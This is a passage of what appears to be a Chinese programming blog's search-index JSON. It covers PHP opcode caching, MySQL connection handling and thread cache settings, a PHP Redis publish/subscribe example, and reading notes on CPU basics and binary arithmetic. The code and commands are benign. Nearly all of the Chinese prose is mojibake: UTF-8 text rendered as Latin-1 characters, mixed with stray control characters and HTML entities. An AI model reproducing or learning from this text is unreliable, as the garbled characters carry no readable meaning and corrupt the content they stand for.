æ³•ç›´æ¥æ‰§è¡Œï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œä¸€ç³»åˆ—çš„ä»£ç åˆ†æå·¥ä½œï¼Œå½“è§£é‡Šå™¨å®Œæˆå¯¹è„šæœ¬ä»£ç çš„åˆ†æåï¼Œä¾¿å°†å®ƒä»¬ç”Ÿæˆå¯ä»¥ç›´æ¥è¿è¡Œçš„ä¸­é—´ä»£ç ï¼Œä¹Ÿç§°ä¸ºæ“ä½œç ï¼ˆOperate Codeï¼Œopcodeï¼‰ã€‚ å¯¹äºè§£é‡Šå‹è¯­è¨€è€Œè¨€ï¼Œä»ç¨‹åºä»£ç åˆ°ä¸­é—´ä»£ç çš„è¿™ä¸ªè¿‡ç¨‹ï¼Œæˆ‘ä»¬ç§°ä¸ºè§£é‡Šï¼ˆparseï¼‰ï¼Œå®ƒç”±è§£é‡Šå™¨æ¥å®Œæˆã€‚å¯¹äºç¼–è¯‘å‹è¯­è¨€è€Œè¨€ï¼Œä»ç¨‹åºä»£ç åˆ°ä¸­é—´ä»£ç çš„è¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºç¼–è¯‘ï¼ˆcompileï¼‰ã€‚ ç¼–è¯‘å™¨å’Œè§£é‡Šå™¨çš„ä¸€ä¸ªæœ¬è´¨åŒºåˆ«åœ¨äºï¼Œè§£é‡Šå™¨ç”Ÿæˆä¸­é—´ä»£ç åï¼Œä¾¿ç›´æ¥æ‰§è¡Œå®ƒï¼Œæ‰€ä»¥è¿è¡Œæ—¶çš„æ§åˆ¶æƒåœ¨è§£é‡Šå™¨; è€Œç¼–è¯‘å™¨åˆ™å°†ä¸­é—´ä»£ç è¿›ä¸€æ­¥ä¼˜åŒ–ï¼Œç”Ÿæˆå¯ä»¥ç›´æ¥è¿è¡Œçš„ç›®æ ‡ç¨‹åºï¼Œä½†ä¸æ‰§è¡Œå®ƒï¼Œç”¨æˆ·å¯ä»¥åœ¨éšåçš„ä»»æ„æ—¶é—´æ‰§è¡Œå®ƒï¼Œè¿™æ—¶æ§åˆ¶æƒåœ¨ç›®æ ‡ç¨‹åºï¼Œå’Œç¼–è¯‘å™¨æ²¡æœ‰ä»»ä½•å…³ç³»ã€‚ äº‹å®ä¸Šï¼Œå°±è§£é‡Šå’Œç¼–è¯‘æœ¬èº«è€Œè¨€ï¼Œå®ƒä»¬çš„åŸç†æ˜¯ç›¸ä¼¼çš„ï¼Œéƒ½åŒ…æ‹¬è¯æ³•åˆ†æã€è¯­æ³•åˆ†æã€è¯­ä¹‰åˆ†æç­‰ã€‚ ä¸ºä»€ä¹ˆå¼€å¯ opcodeï¼Œå¯¹æ€§èƒ½çš„æå‡ä¼šå·¨å¤§ï¼Ÿè¿™æ˜¯å› ä¸º PHP åœ¨åŠ¨æ€è§£æè¯­æ³•çš„è¿‡ç¨‹ä¸­ï¼Œä¼šç”Ÿæˆæ“ä½œç ï¼Œè€Œæ‰“å¼€opcode ç¼“å­˜ï¼Œå°±å¯ä»¥é¿å…é‡å¤ç¼–è¯‘ã€‚ å½“ç„¶ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„åŠ¨æ€å†…å®¹éƒ½åœ¨åº”ç”¨äº† opcode cache ä¹‹åæœ‰å¤§å¹…åº¦çš„æ€§èƒ½æå‡ï¼Œå› ä¸º opcode cache çš„ç›®çš„æ˜¯å‡å°‘CPU å’Œå†…å­˜å¼€é”€ï¼Œå¦‚æœåŠ¨æ€å†…å®¹çš„æ€§èƒ½ç“¶é¢ˆä¸åœ¨äºCPU å’Œå†…å­˜ï¼Œè€Œåœ¨äºI/O æ“ä½œï¼Œæ¯”å¦‚æ•°æ®åº“æŸ¥è¯¢å¸¦æ¥çš„ç£ç›˜I/O å¼€é”€ï¼Œé‚£ä¹ˆopcode cache çš„æ€§èƒ½æå‡æ˜¯éå¸¸æœ‰é™çš„ã€‚ æœ‰æ„ä¹‰çš„é—®é¢˜Qï¼šå‡å¦‚100 ä¸ªç”¨æˆ·åŒæ—¶å‘æœåŠ¡å™¨åˆ†åˆ«è¿›è¡Œ 10æ¬¡è¯·æ±‚ï¼Œä¸ 1 ä¸ªç”¨æˆ·å‘æœåŠ¡å™¨è¿ç»­è¿›è¡Œ 1000 æ¬¡è¯·æ±‚ï¼Œæ•ˆæœä¸€æ ·å—ï¼Ÿä¹Ÿå°±æ˜¯è¯´ç»™æœåŠ¡å™¨å¸¦æ¥çš„å‹åŠ›ä¸€æ ·å—ï¼ŸAï¼šè™½ç„¶çœ‹èµ·æ¥æœåŠ¡å™¨éƒ½éœ€è¦è¿ç»­å¤„ç† 1000 ä¸ªè¯·æ±‚ï¼Œå…¶å®å…³é”®çš„åŒºåˆ«å°±åœ¨äºï¼Œæ˜¯å¦çœŸçš„â€è¿ç»­â€œã€‚é¦–å…ˆæœ‰ä¸€ç‚¹éœ€è¦æ˜ç™½ï¼Œå¯¹äºå‹åŠ›æµ‹è¯•ä¸­æåˆ°çš„æ¯ä¸€ä¸ªç”¨æˆ·ï¼Œè¿ç»­å‘é€è¯·æ±‚å®é™…ä¸Šæ˜¯æŒ‡åœ¨å‘é€ä¸€ä¸ªè¯·æ±‚å¹¶æ¥å—åˆ°å“åº”æ•°æ®åå†å‘é€ä¸‹ä¸€ä¸ªè¯·æ±‚ï¼Œè¿™æ ·ä¸€æ¥ï¼Œä»å¾®è§‚å±‚é¢æ¥çœ‹ï¼Œ1 ä¸ªç”¨æˆ·å‘æœåŠ¡å™¨è¿ç»­è¿›è¡Œ 1000æ¬¡è¯·æ±‚çš„è¿‡ç¨‹ä¸­ï¼Œä»»ä½•æ—¶åˆ»æœåŠ¡å™¨çš„ç½‘å¡æ¥æ”¶ç¼“å†²åŒºä¸­åªæœ‰æ¥è‡ªè¯¥ç”¨æˆ·çš„ 1 ä¸ªè¯·æ±‚ï¼Œè€Œ 100 ä¸ªç”¨æˆ·åŒæ—¶å‘æœåŠ¡å™¨åˆ†åˆ«è¿›è¡Œ 10 æ¬¡è¯·æ±‚çš„è¿‡ç¨‹ä¸­ï¼ŒæœåŠ¡å™¨ç½‘å¡æ¥æ”¶ç¼“å†²åŒºæœ€å¤šæœ‰ 100 ä¸ªç­‰å¾…å¤„ç†çš„è¯·æ±‚ï¼Œæ˜¾ç„¶è¿™æ—¶æœåŠ¡å™¨çš„å‹åŠ›æ›´å¤§ã€‚ Qï¼šå…³äºworker è¿›ç¨‹çš„æ•°é‡ï¼Œæ—¢ç„¶å¯ä»¥ç”±æˆ‘ä»¬æ¥è®¾ç½®ï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯è¶Šå¤šè¶Šå¥½å‘¢ï¼ŸAï¼šæ˜¾ç„¶ä¸æ˜¯ï¼Œä»»ä½•æ—¶åˆ»ä»CPU çš„è§’åº¦æ¥çœ‹ï¼Œåªæœ‰ä¸€ä¸ªè¿›ç¨‹åœ¨è¿è¡Œã€‚æ²¡æœ‰ä¸€ä¸ªç»å¯¹çš„å…¬å¼æ¥å‘Šè¯‰ä½ å¦‚ä½•é€‰æ‹©worker è¿›ç¨‹æ•°ï¼Œéœ€è¦æ ¹æ®å®é™…æƒ…å†µå…·ä½“åˆ†æå’Œè°ƒæ•´ã€‚ Qï¼š7ms æ„å‘³ç€ä»€ä¹ˆå‘¢ï¼ŸAï¼šä¸€ä¸ªæ¯”ç‰¹é€šè¿‡å…‰çº¤ä»åŒ—äº¬ä¼ åˆ°è¥¿å®‰ï¼Œç†è®ºä¸Šåªéœ€è¦ 5ms; 25 æ¯«ç§’è¶³ä»¥è®©æ¯”ç‰¹ä¼ æ’­æ¥è¿‘åœ°çƒèµ¤é“åŠå¾„çš„è·ç¦»ã€‚ Qï¼šç¼“å­˜çš„ç›®çš„ï¼ŸAï¼šç¼“å­˜çš„ç›®çš„å°±æ˜¯æŠŠéœ€è¦èŠ±è´¹æ˜‚è´µå¼€é”€çš„è®¡ç®—ç»“æœä¿å­˜èµ·æ¥ï¼Œåœ¨ä»¥æ¥éœ€è¦çš„æ—¶å€™ç›´æ¥å–å‡ºï¼Œé¿å…é‡å¤è®¡ç®—ã€‚","categories":[{"name":"è¯»ä¹¦ç¬”è®°","slug":"è¯»ä¹¦ç¬”è®°","permalink":"https://www.0x2beace.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"è¯»ä¹¦ç¬”è®°","slug":"è¯»ä¹¦ç¬”è®°","permalink":"https://www.0x2beace.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}]},{"title":"PHP ä¸­å®ç° Mysql è¿æ¥æ± ä¸æŒä¹…åŒ–","slug":"mysql-connection-pool-and-persistence-in-php","date":"2021-02-03T11:42:17.000Z","updated":"2021-02-03T12:46:55.581Z","comments":true,"path":"mysql-connection-pool-and-persistence-in-php/","link":"","permalink":"https://www.0x2beace.com/mysql-connection-pool-and-persistence-in-php/","excerpt":"Mysql çš„è¿æ¥æ–¹å¼æœ‰ä¸¤ç§ï¼štcp å’Œ socketã€‚å‰è€…æ˜¯åŸºäºtcp/ipåè®®ï¼Œåè€…æ˜¯åŸºäºsocket å¥—æ¥å­—ã€‚","text":"Mysql çš„è¿æ¥æ–¹å¼æœ‰ä¸¤ç§ï¼štcp å’Œ socketã€‚å‰è€…æ˜¯åŸºäºtcp/ipåè®®ï¼Œåè€…æ˜¯åŸºäºsocket å¥—æ¥å­—ã€‚ å…·ä½“ï¼š tcp/ipï¼šmysql -h 127.0.0.1 -uroot -p socketï¼šmysql -h localhost -uroot -p æˆ–è€… mysql -uroot -p å¯ä»¥é€šè¿‡ tcpdumpå‘½ä»¤æŠ“åŒ…ã€‚ æŒ‡å®šæºç«¯å£ï¼š 1$ tcpdump -i lo0 port 3306 å¦‚æœå‡ºç°ä»¥ä¸‹å†…å®¹ï¼Œè¡¨ç¤ºæœ¬åœ°æ²¡æœ‰lo0è¿™ä¸ªè®¾å¤‡ã€‚ 12tcpdump: lo: No such device exists(BIOCSETIF failed: Device not configured) å¯ä»¥é€šè¿‡tcpdump -D å‘½ä»¤æŸ¥çœ‹æœ¬åœ°è®¾å¤‡åç§°ï¼š 121.en0 [Up, Running]2.lo0 [Up, Running, Loopback] ä½¿ç”¨mysql -h 127.0.0.1 -uroot -pï¼Œå¯ä»¥çœ‹åˆ°Mysql çš„è¿æ¥è¿‡ç¨‹æ˜¯åŸºäºtcp/ip åè®®ã€‚ å½“å®¢æˆ·ç«¯é€€å‡ºMysql æ—¶ï¼Œä¼šå‘é€å››æ¡è®°å½•ï¼Œä¹Ÿå°±æ˜¯tcp çš„å››æ¬¡æŒ¥æ‰‹ã€‚ socket æ–¹å¼ä¼šå¿«äºtcp/ipï¼Œ mysql ä½¿ç”¨çº¿ç¨‹æ¥å¤„ç†è¿æ¥ï¼Œæ¯å½“ä¸€ä¸ªè¯·æ±‚è¿›æ¥ï¼ŒMySQLä¼šåˆ›å»ºä¸€ä¸ªçº¿ç¨‹å»å¤„ç†è¯·æ±‚ï¼Œ å¯ä»¥ä½¿ç”¨show statuså‘½ä»¤æŸ¥çœ‹å½“å‰å¤„äºè¿æ¥çŠ¶æ€çš„çº¿ç¨‹ä¸ªæ•°ï¼Œæ‰€ä»¥åœ¨é«˜å¹¶å‘ä¸‹ï¼Œè¿™å°†ç»™MySQLæœåŠ¡å™¨å¸¦æ¥å·¨å¤§çš„å‹åŠ›ï¼Œæ¶ˆè€—æœåŠ¡å™¨èµ„æºã€‚ Mysql çº¿ç¨‹æ± å®é™…ä¸Š mysql å®ç°äº†çº¿ç¨‹æ± ï¼Œå½“å®¢æˆ·ç«¯æ–­å¼€è¿æ¥åï¼Œmysql ä¼šå°†å½“å‰çº¿ç¨‹ç¼“å­˜èµ·æ¥ï¼Œå½“ä¸‹ä¸€æ¬¡æœ‰æ–°çš„è¯·æ±‚è¿›æ¥æ—¶ï¼Œæ— éœ€åˆ›å»ºæ–°çš„çº¿ç¨‹ã€‚ æŸ¥çœ‹çº¿ç¨‹æ± å¤§å°ï¼š 1mysql&gt; show variables like &#39;thread_cache_size&#39;; è®¾ç½®çº¿ç¨‹æ± å¤§å°ï¼š 1mysql&gt; set global thread_cache_size &#x3D; 20; æŸ¥çœ‹çº¿ç¨‹æ± çŠ¶æ€ï¼š 12345678910mysql&gt; show status like &#39;Threads_%&#39;;+-------------------+-------+| Variable_name | Value |+-------------------+-------+| Threads_cached | 8 || Threads_connected | 3 || Threads_created | 53 || Threads_running | 1 |+-------------------+-------+4 rows in set (0.02 sec) å…¶ä¸­ï¼š Threads_cachedï¼šç©ºé—²çº¿ç¨‹æ•°é‡ã€‚å½“æœ‰æ–°çš„è¯·æ±‚è¿›æ¥æ—¶ï¼Œmysql ä¸ä¼šç«‹å³åˆ›å»ºçº¿ç¨‹å»å¤„ç†ï¼Œè€Œæ˜¯å»Threads_cachedæŸ¥çœ‹ç©ºé—²çš„è¿æ¥çº¿ç¨‹ï¼Œå¦‚æœå­˜åœ¨åˆ™ç›´æ¥ä½¿ç”¨ï¼Œä¸å­˜åœ¨åˆ™åˆ›å»ºæ–°çš„çº¿ç¨‹ã€‚ Threads_connectedï¼šå½“å‰å¤„äºè¿æ¥çŠ¶æ€çš„çº¿ç¨‹ä¸ªæ•°ã€‚ Threads_createdï¼šåˆ›å»ºè¿‡çš„çº¿ç¨‹æ•°ï¼Œå¦‚æœå‘ç°Threads_createdå€¼è¿‡å¤§çš„è¯ï¼Œè¡¨æ˜ mysql æœåŠ¡å™¨ä¸€ç›´åœ¨åˆ›å»ºçº¿ç¨‹ï¼Œè¿™ä¹Ÿæ˜¯æ¯”è¾ƒè€—èµ„æºï¼Œå¯ä»¥é€‚å½“å¢åŠ é…ç½®æ–‡ä»¶ä¸­Thread_cache_sizeå€¼ã€‚ Threads_runningï¼šå¤„äºæ¿€æ´»çŠ¶æ€çš„çº¿ç¨‹çš„ä¸ªæ•°ï¼Œè¿™ä¸ªä¸€èˆ¬éƒ½æ˜¯è¿œå°äºThreads_connectedçš„ã€‚ çº¿ç¨‹æ± çš„å‡ºç°è§£å†³äº†é¢‘ç¹çš„åˆ›å»ºè¿æ¥å’Œé”€æ¯è¿æ¥çš„é—®é¢˜ï¼Œä½†ä»…æœ‰çº¿ç¨‹æ± è¿˜æ˜¯ä¸å¤Ÿçš„ï¼Œä¸èƒ½è§£å†³å®¢æˆ·ç«¯é¢‘ç¹è¿æ¥mysql å¸¦æ¥çš„æ€§èƒ½æŸè€—ã€‚ å‚è€ƒé“¾æ¥ PHPä¸­å®ç°MySQLè¿æ¥æ± ä¸æŒä¹…åŒ– ç”¨Swoole4 æ‰“é€ é«˜å¹¶å‘çš„PHPåç¨‹Mysqlè¿æ¥æ± ","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"PHP å®è·µ Redis å‘å¸ƒè®¢é˜…","slug":"php-practice-redis-publish-and-subscribe","date":"2021-01-22T14:57:36.000Z","updated":"2021-01-22T14:58:49.610Z","comments":true,"path":"php-practice-redis-publish-and-subscribe/","link":"","permalink":"https://www.0x2beace.com/php-practice-redis-publish-and-subscribe/","excerpt":"Redis é›†æˆäº†Pub/SubåŠŸèƒ½ï¼ˆmeans Publish, Subscribeï¼‰å³å‘å¸ƒåŠè®¢é˜…åŠŸèƒ½ã€‚","text":"Redis é›†æˆäº†Pub/SubåŠŸèƒ½ï¼ˆmeans Publish, Subscribeï¼‰å³å‘å¸ƒåŠè®¢é˜…åŠŸèƒ½ã€‚ Redis æœ‰å„ç§è¯­è¨€çš„å®¢æˆ·ç«¯ï¼Œè¿™é‡Œä»…ä»¥PHP çš„å®¢æˆ·ç«¯æ¥äº†è§£Redis çš„å‘å¸ƒè®¢é˜…ã€‚ å‘å¸ƒè€…ï¼šå³publishå®¢æˆ·ç«¯ï¼Œæ— éœ€ç‹¬å é“¾æ¥ï¼Œä½ å¯ä»¥åœ¨publishæ¶ˆæ¯çš„åŒæ—¶ï¼Œä½¿ç”¨åŒä¸€ä¸ªredis-clienté“¾æ¥è¿›è¡Œå…¶ä»–æ“ä½œï¼ˆä¾‹å¦‚ï¼šINCRç­‰ï¼‰ è®¢é˜…è€…ï¼šå³subscribeå®¢æˆ·ç«¯ï¼Œéœ€è¦ç‹¬å é“¾æ¥ï¼Œå³è¿›è¡ŒsubscribeæœŸé—´ï¼Œredis-clientæ— æ³•ç©¿æ’å…¶ä»–æ“ä½œï¼Œæ­¤æ—¶clientä»¥é˜»å¡çš„æ–¹å¼ç­‰å¾…â€œpublishç«¯â€çš„æ¶ˆæ¯ï¼›è¿™ä¸€ç‚¹å¾ˆå¥½ç†è§£ï¼Œå› æ­¤subscribeç«¯éœ€è¦ä½¿ç”¨å•ç‹¬çš„é“¾æ¥ï¼Œç”šè‡³éœ€è¦åœ¨é¢å¤–çš„çº¿ç¨‹ä¸­ä½¿ç”¨ã€‚ ç»ˆç«¯å®ç°è®¢é˜…è€…è®¢é˜…é¢‘é“ï¼š å‘å¸ƒè€…å‘é¢‘é“ä¸­å‘é€å†…å®¹ ä»£ç å®ç°subscribe å®¢æˆ·ç«¯ï¼š 12345678910111213141516171819202122&lt;?php$redis &#x3D; getConnect();$redis-&gt;setOption(Redis::OPT_READ_TIMEOUT, -1); $redis-&gt;subscribe([&quot;channel1&quot;], function ($instance, $chan, $msg) &#123; echo $msg; &#x2F;** * $instance æ˜¯ä¸Šé¢åˆ›å»ºçš„Redis å®ä¾‹å¯¹è±¡ï¼Œå› ä¸ºç‹¬å é“¾æ¥çš„å…³ç³»ï¼Œè¯¥å®ä¾‹ä¸èƒ½æ‰§è¡Œå…¶ä»–æ“ä½œã€‚ * å¦‚æœè¦ä½¿ç”¨Redisï¼Œéœ€æ–°å»ºä¸€ä¸ªè¿æ¥ *&#x2F; $redis &#x3D; getConnect(); $redis-&gt;get(&quot;name&quot;); &#x2F;&#x2F; todo ä¸šåŠ¡é€»è¾‘&#125;);function getConnect()&#123; $redis &#x3D; new Redis(); $redis-&gt;connect(&quot;127.0.0.1&quot;, 6379); $redis-&gt;auth(&quot;&quot;); return $redis;&#125; publish å®¢æˆ·ç«¯ï¼š 12345&lt;?php$redis &#x3D; new Redis();$redis-&gt;connect(&quot;127.0.0.1&quot;, 6379);$redis-&gt;publish(&#39;channel1&#39;, &#39;hello, redis&#39;); æ³¨æ„subscribe å®¢æˆ·ç«¯éœ€è¦æ‰‹åŠ¨è®¾ç½®ä¸è¶…æ—¶ï¼Œæœ‰ä¸¤ç§æ–¹å¼ï¼š ini_set(&#39;default_socket_timeout&#39;, -1) $redis-&gt;setOption(Redis::OPT_READ_TIMEOUT, -1) å¦‚æœä¸è®¾ç½®ä¸è¶…æ—¶ï¼Œ60såä¼šæŠ¥ä¸€ä¸ªé”™è¯¯ï¼š 1Fatal error: Uncaught RedisException: read error on connection to 127.0.0.1:6379 æ–¹å¼ä¸€æ˜¯é€šè¿‡ä¸´æ—¶ä¿®æ”¹ php.ini é…ç½®é¡¹ï¼Œdefault_socket_timeouté»˜è®¤ä¸º 60s ã€‚ default_socket_timeout æ˜¯socketæµçš„è¶…æ—¶å‚æ•°ï¼Œå³socketæµä»å»ºç«‹åˆ°ä¼ è¾“å†åˆ°å…³é—­æ•´ä¸ªè¿‡ç¨‹å¿…é¡»è¦åœ¨è¿™ä¸ªå‚æ•°è®¾ç½®çš„æ—¶é—´ä»¥å†…å®Œæˆï¼Œå¦‚æœä¸èƒ½å®Œæˆï¼Œé‚£ä¹ˆPHPå°†è‡ªåŠ¨ç»“æŸè¿™ä¸ªsocketå¹¶è¿”å›ä¸€ä¸ªè­¦å‘Šã€‚ æ¨èç¬¬äºŒç§ï¼Œå› ä¸ºæ–¹å¼äºŒæ˜¯é€šè¿‡ä¿®æ”¹redisçš„é…ç½®é¡¹ï¼Œå› æ­¤ä»…å¯¹redisè¿æ¥ç”Ÿæ•ˆï¼Œç›¸å¯¹äºæ–¹å¼ä¸€ï¼Œä¸ä¼šäº§ç”Ÿæ„å¤–çš„å¯¹å…¶ä»–éƒ¨åˆ†çš„å½±å“ã€‚ å‚è€ƒé“¾æ¥ phpå®ç°redisæ¶ˆæ¯å‘å¸ƒè®¢é˜…","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Redis","slug":"PHP/Redis","permalink":"https://www.0x2beace.com/categories/PHP/Redis/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/tags/Redis/"}]},{"title":"ã€Šç¨‹åºæ˜¯æ€æ ·è·‘èµ·æ¥çš„ã€‹è¯»ä¹¦ç¬”è®°","slug":"How-does-the-program-run-reading-notes","date":"2021-01-21T14:01:32.000Z","updated":"2021-02-03T12:47:57.415Z","comments":true,"path":"How-does-the-program-run-reading-notes/","link":"","permalink":"https://www.0x2beace.com/How-does-the-program-run-reading-notes/","excerpt":"ã€Šç¨‹åºæ˜¯æ€æ ·è·‘èµ·æ¥çš„ã€‹è¯»ä¹¦ç¬”è®°","text":"ã€Šç¨‹åºæ˜¯æ€æ ·è·‘èµ·æ¥çš„ã€‹è¯»ä¹¦ç¬”è®° CPUCPUï¼ˆè®¡ç®—æœºï¼‰èƒ½å¤Ÿç›´æ¥è¯†åˆ«å’Œæ‰§è¡Œçš„åªæœ‰æœºå™¨è¯­è¨€ã€‚ä½¿ç”¨ Cã€Java ç­‰è¯­ è¨€ç¼–å†™çš„ç¨‹åºï¼Œæœ€åéƒ½ä¼šè½¬åŒ–æˆæœºå™¨è¯­è¨€ã€‚ CPU å’Œå†…å­˜æ˜¯ç”±è®¸å¤šæ™¶ä½“ç®¡ç»„æˆçš„ç”µå­éƒ¨ä»¶ï¼Œé€šå¸¸ç§°ä¸º IC (Integrated Circuitï¼Œé›†æˆç”µè·¯)ã€‚ CPU çš„å†…éƒ¨ç”±å¯„å­˜å™¨ã€æ§åˆ¶å™¨ã€è¿ç®—å™¨å’Œæ—¶é’Ÿå››ä¸ªéƒ¨åˆ†æ„æˆï¼Œå„éƒ¨åˆ†ä¹‹é—´ ç”±ç”µæµä¿¡å·ç›¸äº’è¿é€šã€‚ å¯„å­˜å™¨ï¼š å¯„å­˜å™¨\u0003å¯ç”¨æ¥æš‚å­˜æŒ‡ä»¤ã€æ•°æ®ç­‰å¤„ç†å¯¹è±¡ï¼Œå¯ä»¥å°†å…¶çœ‹ä½œæ˜¯å†…å­˜çš„ä¸€ç§ã€‚æ ¹æ®ç§ç±»çš„ä¸åŒï¼Œä¸€ä¸ª CPU å†…éƒ¨ä¼šæœ‰20~100 ä¸ªå¯„å­˜å™¨ã€‚ æ§åˆ¶å™¨ï¼šæ§åˆ¶å™¨\u0003è´Ÿè´£æŠŠå†…å­˜ä¸Šçš„æŒ‡ä»¤ã€æ•°æ®ç­‰è¯»å…¥å¯„å­˜å™¨ï¼Œå¹¶æ ¹æ®æŒ‡ä»¤çš„æ‰§è¡Œç»“æœæ¥æ§åˆ¶æ•´ä¸ªè®¡ç®—æœºã€‚ è¿ç®—å™¨ï¼šè¿ç®—å™¨\u0003è´Ÿè´£è¿ç®—ä»å†…å­˜è¯»å…¥å¯„å­˜å™¨çš„æ•°æ®ã€‚ æ—¶é’Ÿï¼šæ—¶é’Ÿ\u0003è´Ÿè´£å‘å‡º CPU å¼€å§‹è®¡æ—¶çš„æ—¶é’Ÿä¿¡å·ã€‚ æ—¶é’Ÿä¿¡å·è‹±æ–‡å«ä½œ clock puzzleã€‚Pentium 2 GHz è¡¨ç¤ºæ—¶é’Ÿä¿¡å·çš„é¢‘ç‡ä¸º 2 GHz(1 GHz = 10 äº¿æ¬¡ / ç§’)ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ—¶é’Ÿä¿¡å·çš„é¢‘ç‡è¶Šé«˜ï¼ŒCPU çš„ è¿è¡Œé€Ÿåº¦è¶Šå¿«ã€‚ é€šå¸¸æˆ‘ ä»¬å°†æ±‡ç¼–è¯­è¨€ç¼–å†™çš„ç¨‹åºè½¬åŒ–æˆæœºå™¨è¯­è¨€çš„è¿‡ç¨‹ç§°ä¸º æ±‡ç¼–;åä¹‹ï¼Œæœºå™¨è¯­è¨€ç¨‹åºè½¬åŒ–æˆæ±‡ç¼–è¯­è¨€ç¨‹åºçš„è¿‡ç¨‹åˆ™ç§°ä¸º åæ±‡ç¼–ã€‚ é«˜çº§è¯­è¨€ç¼–å†™çš„ç¨‹åº =ã€‹ç»è¿‡ç¼–è¯‘è½¬æ¢ä¸ºæœºå™¨è¯­è¨€=ã€‹CPUå†…éƒ¨çš„å¯„å­˜å™¨æ¥è¿›è¡Œå¤„ç†ã€‚ ç¼–è¯‘æŒ‡çš„æ˜¯ä½¿ç”¨é«˜çº§ç¼–ç¨‹è¯­è¨€ç¼–å†™çš„ç¨‹åºè½¬æ¢ä¸ºæœºå™¨è¯­è¨€çš„è¿‡ç¨‹ï¼Œå…¶ä¸­ï¼Œç”¨äºè½¬æ¢çš„ç¨‹åºè¢«ç§°ä¸ºç¼–è¯‘å™¨ã€‚ å¯¹äºç¨‹åºå‘˜æ¥è¯´ï¼ŒCPU æ˜¯ä»€ä¹ˆå‘¢ï¼ŸCPU æ˜¯å…·æœ‰å„ç§åŠŸèƒ½çš„å¯„å­˜å™¨çš„é›†åˆä½“ï¼Œæ‰€ä»¥å¯ä»¥å°†å¯„å­˜å™¨ç†è§£æˆæ˜¯CPU çš„æ ¸å¿ƒï¼Œä¸»è¦æ‰¿æ‹…ç€æŒ‡ä»¤ã€æ•°æ®çš„å¤„ç†ã€‚ äºŒè¿›åˆ¶è½¬åè¿›åˆ¶çš„æ–¹å¼ï¼šå³å„ä½æ•°çš„æ•°å€¼å’Œä½æƒç›¸ä¹˜åå†ç›¸åŠ çš„æ•°å€¼ã€‚ ä½æƒçš„æ¦‚å¿µï¼š39 = 3 * 10 + 9 * 1 å…¶ä¸­ 10 å’Œ 1 å°±æ˜¯ä½æƒã€‚åœ¨åè¿›åˆ¶ä¸­ï¼Œç¬¬ 1 ä½(æœ€å³è¾¹çš„ä¸€ä½) æ˜¯ 10 çš„ 0 æ¬¡å¹‚ A(= 1)ï¼Œç¬¬ 2 ä½æ˜¯ 10 çš„ 1 æ¬¡å¹‚(= 10)ï¼Œç¬¬ 3 ä½æ˜¯ 10 çš„ 2 æ¬¡å¹‚(= 100)ã€‚ åœ¨äºŒè¿›åˆ¶ä¸­ï¼Œç¬¬ 1 ä½æ˜¯ 2 çš„ 0 æ¬¡å¹‚ (= 1)ï¼Œç¬¬2ä½æ˜¯2çš„1æ¬¡å¹‚(= 2)ï¼Œè¿™å°±æ˜¯ä½æƒã€‚ æ— è®ºç¨‹åºä¸­ä½¿ç”¨çš„æ˜¯å¤šå°‘è¿›åˆ¶ï¼Œè®¡ç®—æœºæœ€ç»ˆéƒ½ä¼šè½¬æ¢ä¸ºäºŒè¿›åˆ¶æ¥å¤„ç†ã€‚ äºŒè¿›åˆ¶äºŒè¿›åˆ¶çš„è¿ç®—æ–¹å¼æ˜¯ï¼šå¯¹äºåè¿›åˆ¶ï¼Œè¿›è¡ŒåŠ æ³•è¿ç®—æ—¶é€¢åè¿›ä¸€ï¼Œè¿›è¡Œå‡æ³•è¿ç®—æ—¶å€Ÿä¸€å½“åï¼›å¯¹äºäºŒè¿›åˆ¶ï¼Œè¿›è¡ŒåŠ æ³•è¿ç®—æ—¶é€¢äºŒè¿›ä¸€ï¼Œè¿›è¡Œå‡æ³•è¿ç®—æ—¶å€Ÿä¸€å½“äºŒã€‚ äºŒè¿›åˆ¶æ•°ä¸­è¡¨ç¤ºè´Ÿæ•°å€¼æ—¶ï¼Œä¸€èˆ¬ä¼šæŠŠæœ€é«˜ä½ä½œä¸ºç¬¦å·æ¥ä½¿ç”¨ï¼Œå› æ­¤æˆ‘ä»¬æŠŠè¿™ä¸ªæœ€é«˜ä½ç§°ä¸ºç¬¦å·ä½ã€‚ ç¬¦å·ä½æ˜¯ 0 æ—¶è¡¨ç¤ºæ­£æ•° ï¼Œç¬¦å·ä½æ˜¯ 1 æ—¶è¡¨ç¤ºè´Ÿæ•°ã€‚ å°†äºŒè¿›åˆ¶æ•°çš„å€¼å–åååŠ  1 çš„ç»“æœï¼Œå’ŒåŸæ¥çš„å€¼ç›¸åŠ ï¼Œç»“æœä¸º0 ã€‚å®é™…ä¸Šå°±æ˜¯1 + (-1) = 0 è®¡ç®—æœºè¿›è¡Œå°æ•°è¿ç®— ä¸ºä»€ä¹ˆå°†0.1 ç´¯åŠ ä¸€ç™¾æ¬¡æ— æ³•å¾—åˆ° 10ï¼Ÿ è¿™æ˜¯å› ä¸ºè®¡ç®—æœºæ— æ³•å‡†ç¡®ç”¨äºŒè¿›åˆ¶è¡¨ç¤º 0.1ï¼Œ åè¿›åˆ¶çš„0.1 è½¬æ¢æˆäºŒè¿›åˆ¶åï¼Œä¼šå˜æˆ0.00011001100...(1100 å¾ªç¯)è¿™æ ·çš„ å¾ªç¯å°æ•°ï¼Œè¿™å’Œæ— æ³•ç”¨åè¿›åˆ¶å‡†ç¡®è¡¨ç¤º 1/3 ä¸€æ ·çš„é“ç†ã€‚ å› æ­¤ï¼Œåœ¨ é‡åˆ°å¾ªç¯å°æ•°æ—¶ï¼Œè®¡ç®—æœºå°±ä¼šæ ¹æ®å˜é‡æ•°æ®ç±»å‹æ‰€å¯¹åº”çš„é•¿åº¦å°†æ•°å€¼ 